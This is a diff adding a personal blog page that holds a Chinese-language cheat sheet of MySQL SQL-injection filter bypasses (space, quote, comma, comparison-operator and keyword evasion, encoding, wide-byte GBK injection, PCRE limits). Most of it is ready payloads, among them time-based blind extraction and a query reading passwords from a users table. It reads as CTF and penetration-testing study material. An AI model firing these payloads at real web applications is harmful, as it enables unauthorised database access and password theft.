@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>y0lo&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SQL注入绕过技巧0X01 绕过空格（注释符&#x2F;**&#x2F;,%a0）:两个空格代表一个空格，用tab代替空格，%a0&#x3D;空格： 1%20	%09	%0a	%0b	%0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F;   最基本的绕过方法，用注释替换空格： 1&#x2F;* 注释 *&#x2F;   使用浮点数： 12select * from users where id&#x3D;8E0union s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="y0lo&#39;s blogs">
+<meta property="og:url" content="http://example.com/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="y0lo&#39;s blogs">
+<meta property="og:description" content="SQL注入绕过技巧0X01 绕过空格（注释符&#x2F;**&#x2F;,%a0）:两个空格代表一个空格，用tab代替空格，%a0&#x3D;空格： 1%20	%09	%0a	%0b	%0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F;   最基本的绕过方法，用注释替换空格： 1&#x2F;* 注释 *&#x2F;   使用浮点数： 12select * from users where id&#x3D;8E0union s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/1206476-20170728221518555-1717045547.png">
+<meta property="article:published_time" content="2021-01-07T06:18:12.000Z">
+<meta property="article:modified_time" content="2021-01-07T09:43:06.191Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/1206476-20170728221518555-1717045547.png">
+  
+    <link rel="alternate" href="/atom.xml" title="y0lo's blogs" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">y0lo&#39;s blogs</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-SQL注入绕过技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="article-date">
+  <time class="dt-published" datetime="2021-01-07T06:18:12.000Z" itemprop="datePublished">2021-01-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a>SQL注入绕过技巧</h1><h2 id="0X01-绕过空格（注释符-x2F-x2F-a0）"><a href="#0X01-绕过空格（注释符-x2F-x2F-a0）" class="headerlink" title="0X01 绕过空格（注释符&#x2F;**&#x2F;,%a0）:"></a>0X01 绕过空格（注释符&#x2F;**&#x2F;,%a0）:</h2><p>两个空格代表一个空格，用tab代替空格，%a0&#x3D;空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20	%09	%0a	%0b	%0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
+
+<p> 最基本的绕过方法，用注释替换空格：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 注释 */</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/1206476-20170728221518555-1717045547.png" alt="img"></p>
+<p>使用浮点数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h2 id="0X02-括号绕过空格"><a href="#0X02-括号绕过空格" class="headerlink" title="0X02 括号绕过空格"></a>0X02 括号绕过空格</h2><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>eg:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">user</span>())<span class="keyword">from</span> dual <span class="keyword">where</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span><span class="operator">=</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这种过滤方法常常用于time based盲注,例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">and</span>(sleep(ascii(mid(database()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">109</span>))<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>（from for属于逗号绕过下面会有）</p>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h2 id="0X03-引号绕过"><a href="#0X03-引号绕过" class="headerlink" title="0X03 引号绕过"></a>0X03 引号绕过</h2><p>会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选到users表中所有字段的一条语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p>
+<p><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X04-逗号绕过（使用from或者offset）"><a href="#0X04-逗号绕过（使用from或者offset）" class="headerlink" title="0X04 逗号绕过（使用from或者offset）"></a>0X04 逗号绕过（使用from或者offset）</h2><p>在使用盲注的时候，需要使用到substr()、mid()、limit，这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用join：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>		#等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+
+<p>使用like：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>		#等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于<code>limit</code>可以 使用<code>offset</code>来绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">#等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X05-比较符号（-lt-gt-）绕过（过滤了-lt-gt-sqlmap盲注经常使用-lt-gt-，使用between的脚本）："><a href="#0X05-比较符号（-lt-gt-）绕过（过滤了-lt-gt-sqlmap盲注经常使用-lt-gt-，使用between的脚本）：" class="headerlink" title="0X05 比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;:sqlmap盲注经常使用&lt;&gt;，使用between的脚本）："></a>0X05 比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;:sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</h2><p>使用<code>greatest()</code>、<code>least()</code>：前者返回最大值，后者返回最小值</p>
+<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code> 来进行绕过了。</p>
+<p>最常见的一个的盲注的sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用，那么就可以使用<code>greatest</code>来代替比较操作符了。<code>greatest(n1,n2,n3,...)</code>函数返回输入参数<code>(n1,n2,n3,....)</code>的最大值。</p>
+<p> 那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用between and：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">between</span> a <span class="keyword">and</span> b:</span><br><span class="line"><span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>;	等价于<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X06-or-and-xor-not绕过："><a href="#0X06-or-and-xor-not绕过：" class="headerlink" title="0X06 or and xor not绕过："></a>0X06 or and xor not绕过：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span>	<span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span>	xor<span class="operator">=</span><span class="operator">|</span>	<span class="keyword">not</span><span class="operator">=</span><span class="operator">!</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X07-绕过注释符号（-，–（后面跟一个空格））过滤："><a href="#0X07-绕过注释符号（-，–（后面跟一个空格））过滤：" class="headerlink" title="0X07 绕过注释符号（#，–（后面跟一个空格））过滤："></a>0X07 绕过注释符号（#，–（后面跟一个空格））过滤：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>最后的<code>or &#39;1</code>闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure>
+
+<h2 id="0X08-x3D-绕过"><a href="#0X08-x3D-绕过" class="headerlink" title="0X08 &#x3D;绕过"></a>0X08 &#x3D;绕过</h2><p>使用<code>like</code>、<code>rlike</code>、<code>regexp</code>或者 使用<code>&lt;</code> 或者 <code>&gt;</code></p>
+<h2 id="0X09-绕过union，select，where等："><a href="#0X09-绕过union，select，where等：" class="headerlink" title="0X09 绕过union，select，where等："></a>0X09 绕过union，select，where等：</h2><p><strong>（1）使用注释符绕过：</strong></p>
+<p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//、--、/**/、#、--+、-- -、;、%00、--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）使用大小写绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）内联注释绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+<p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+<h2 id="0X10-通用绕过（编码）："><a href="#0X10-通用绕过（编码）：" class="headerlink" title="0X10 通用绕过（编码）："></a>0X10 通用绕过（编码）：</h2><p>如URLEncode编码，ASCII，HEX，unicode编码绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
+
+<h2 id="0X11-等价函数绕过"><a href="#0X11-等价函数绕过" class="headerlink" title="0X11 等价函数绕过"></a>0X11 等价函数绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0X12-宽字节注入"><a href="#0X12-宽字节注入" class="headerlink" title="0X12 宽字节注入"></a>0X12 宽字节注入</h2><p>过滤<code>&#39;</code>的时候往往利用的思路是将<code>&#39;</code>转换为<code>\</code>。</p>
+<p>在mysql中使用GBK编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p><strong>一般产生宽字节注入的PHP函数：</strong></p>
+<p>​    1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p>
+<p>​    2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一（防御此漏洞，要将 mysql_query     设置为 binary 的方式）</p>
+<p>​    3.mysql_real_escape_string()：转义下列字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00     \n     \r     \     &#x27;     &quot;     \x1a</span><br></pre></td></tr></table></figure>
+
+<p>​    （防御，将mysql设置为gbk即可）</p>
+<p><strong>PCRE绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*&#x27;+&#x27;a&#x27;*1000001+&#x27;*/select</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" data-id="cl09mim2t00031kvje0wu876g" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQL注入之万能密码
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/12/05/linux%E3%80%81docker%E3%80%81git%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">linux、docker、git遇到的一些问题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/misc/">misc</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">注入</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
